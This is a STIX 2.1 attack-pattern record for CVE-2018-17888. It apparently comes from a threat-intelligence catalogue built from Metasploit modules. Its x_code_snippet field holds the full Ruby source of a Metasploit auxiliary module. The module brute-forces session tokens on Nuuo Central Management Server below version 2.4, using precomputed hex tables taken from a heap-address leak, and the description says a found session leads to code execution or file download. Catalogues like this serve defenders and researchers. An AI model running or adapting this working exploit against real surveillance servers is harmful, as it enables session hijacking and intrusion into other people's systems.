{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--527e0744-634e-41aa-8834-88a7583a6ce4",
    "created": "2024-08-14T16:32:10.877945Z",
    "modified": "2024-08-14T16:32:10.877948Z",
    "name": "Nuuo Central Management Server User Session Token Bruteforce",
    "description": " Nuuo Central Management Server below version 2.4 has a flaw where it sends the heap address of the user object instead of a real session number when a user logs in. This can be used to reduce the keyspace for the session number from 10 million to 1.2 million, and with a bit of analysis it can be guessed in less than 500k tries. This module does exactly that - it uses a computed occurence table to try the most common combinations up to 1.2 million to try to guess a valid user session. This session number can then be used to achieve code execution or download files - see the other Nuuo CMS auxiliary and exploit modules. Note that for this to work a user has to be logged into the system. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/nuuo_cms_bruteforce.rb",
            "external_id": "nuuo_cms_bruteforce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2018-17888"
        },
        {
            "source_name": "reference",
            "url": "https://www.cisa.gov/uscert/ics/advisories/ICSA-18-284-02"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2019/Jan/51"
        },
        {
            "source_name": "reference",
            "url": "https://raw.githubusercontent.com/pedrib/PoC/master/advisories/NUUO/nuuo-cms-ownage.txt"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'benchmark'\n\nclass MetasploitModule < Msf::Auxiliary\n\n  include Msf::Exploit::Remote::Nuuo\n  include Msf::Auxiliary::Report\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Nuuo Central Management Server User Session Token Bruteforce',\n      'Description'    => %q{\n        Nuuo Central Management Server below version 2.4 has a flaw where it sends the\n        heap address of the user object instead of a real session number when a user logs\n        in. This can be used to reduce the keyspace for the session number from 10 million\n        to 1.2 million, and with a bit of analysis it can be guessed in less than 500k tries.\n        This module does exactly that - it uses a computed occurence table to try the most common\n        combinations up to 1.2 million to try to guess a valid user session.\n        This session number can then be used to achieve code execution or download files - see\n        the other Nuuo CMS auxiliary and exploit modules.\n        Note that for this to work a user has to be logged into the system.\n      },\n      'Author'         =>\n        [\n          'Pedro Ribeiro <pedrib@gmail.com>'         # Vulnerability discovery and Metasploit module\n        ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2018-17888' ],\n          [ 'URL', 'https://www.cisa.gov/uscert/ics/advisories/ICSA-18-284-02' ],\n          [ 'URL', 'https://seclists.org/fulldisclosure/2019/Jan/51' ],\n          [ 'URL', 'https://raw.githubusercontent.com/pedrib/PoC/master/advisories/NUUO/nuuo-cms-ownage.txt' ]\n\n        ],\n      'Platform'       => ['win'],\n      'DisclosureDate'  => '2018-10-11'))\n    deregister_options('SESSION', 'USERNAME', 'PASSWORD')\n  end\n\n  # These tables were generated by doing thousands of requests to a NUUO CMS Server and collecting the  responses.\n  # Table id: hex-nu-mod\n\n  # 2621440 total combinations for both 1.X and 2.X versions\n  # 2.X versions only have 1048576 combinations, and this table will run through them first\n  WEIGHTED_ARRAY_7 =\n    ['2', '1'],\n    ['4', '6', '5', '7', '8', '2', '0', '1', 'f', 'e'],\n    ['1', '6', '0', '8', 'd', '7', 'c', 'e', '2', 'b', 'f', '3', '5', '4', 'a', '9'],\n    ['d', '6', '4', '5', 'f', '0', '8', '7', 'a', '3', '1', 'b', 'c', 'e', '9', '2'],\n    ['3', 'e', 'f', '1', 'c', '5', '9', 'd', '8', '6', '0', '4', 'a', '2', 'b', '7'],\n    ['d', '4', '2', 'b', '3', '6', '8', '1', 'a', '7', 'f', 'e', '0', '9', '5', 'c'],\n    ['8', '0']\n\n  # 189000 total combinations\n  # Only tested (only applies?) to 2.X versions\n  # These are only tried if WEIGHTED_ARRAY_7 fails\n  WEIGHTED_ARRAY_6 =\n    ['9', 'a'],\n    ['7', 'c', '6', 'f', 'e', 'a', 'd', '9', '4', '5', '3', '2', 'b', '0', '8'],\n    ['7', 'b', '6', 'd', 'a', '3', '4', 'f', '5', '1', '8', 'e', 'c', '2'],\n    ['3', '1', 'c', 'f', 'd', '4', 'b', 'a', '6', '2', '5', 'e', '8', '9', '0'],\n    ['3', '6', '7', 'b', 'e', '9', '2', 'f', '4', '1', 'c', 'a', '0', 'd', '8'],\n    ['0', '8']\n\n\n  def session_number_list(weighted_array)\n    # Let's calculate all the possible combinations\n    length = Array.new(weighted_array.length)\n    for i in (0..weighted_array.length-1)\n      length[i] = weighted_array[i].length\n    end\n    counter = Array.new(weighted_array.length)\n    for i in (0..weighted_array.length-1)\n      counter[i] = 0\n    end\n    total = 1\n    for len in length\n      total *= len.to_i\n    end\n\n    print_status(\"Generating #{total} session tokens\")\n    final_list = Array.new\n\n    # code below taken from https://gist.github.com/Yengas/9010715\n    (total).times {\n      if weighted_array.length == 6\n        final_list << weighted_array[0][counter[0]] + weighted_array[1][counter[1]] + weighted_array[2][counter[2]] + weighted_array[3][counter[3]] + weighted_array[4][counter[4]] + weighted_array[5][counter[5]]\n      elsif weighted_array.length == 7\n        final_list << weighted_array[0][counter[0]] + weighted_array[1][counter[1]] + weighted_array[2][counter[2]] + weighted_array[3][counter[3]] + weighted_array[4][counter[4]] + weighted_array[5][counter[5]] + weighted_array[6][counter[6]]\n      else\n        # assume size == 8\n        final_list << weighted_array[0][counter[0]] + weighted_array[1][counter[1]] + weighted_array[2][counter[2]] + weighted_array[3][counter[3]] + weighted_array[4][counter[4]] + weighted_array[5][counter[5]] + weighted_array[6][counter[6]] + weighted_array[7][counter[7]]\n      end\n\n      # Find value of current combination by concatenating corresponding values of counters in the inner-arrays\n      # Then we increment the value of the counter so we go on to the next combination.\n      for index in (counter.length - 1).downto(0) # From (counter array's length - 1) to 0\n        if counter[index] + 1 < length[index] then # If counter index can be incremented\n            counter[index] += 1; # Increment the counter index\n            break; # Stop the incrementation/go to the next combination printing/incrementing.\n        end\n        counter[index] = 0; # Assign current counter index to zero and try incrementing the next counter index.\n      end\n    }\n\n    full_list = Array.new\n    final_list.each { |x|\n      full_list << x.to_i(16)\n    }\n\n    return full_list\n  end\n\n  def session_bruteforce_list(weighted_array)\n    list = session_number_list(weighted_array)\n    for session in list\n      req = client.request_ping({\n        'method' => 'PING',\n        'user_session' => session\n      })\n      # module fails when shutdown/close lots of connections\n      # create own connection and dont call close\n      conn = client.connect(temp: true)\n      res = client.send_recv(req, conn)\n\n      @counter += 1\n      if res && res.status_code == 200\n        return session\n      end\n    end\n    return nil\n  end\n\n  def run\n    connect\n    @counter = 0\n    print_status('Bruteforcing session - this might take a while, go get some coffee!')\n    session = nil\n    time = Benchmark.realtime {\n      session = session_bruteforce_list(WEIGHTED_ARRAY_7)\n      unless session\n        print_error('Failed to bruteforce, trying with the less likely numbers as a last resort...')\n        session = session_bruteforce_list(WEIGHTED_ARRAY_6)\n      end\n    }\n    unless session\n      fail_with(Failure::Unknown, 'Failed to bruteforce user session.')\n    else\n      print_good(\"Found valid user session: #{session}\")\n      print_status(\"Time taken: #{time} seconds; total tries #{@counter}\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2018-10-11",
    "x_mitre_platforms": [
        "['win']"
    ]
}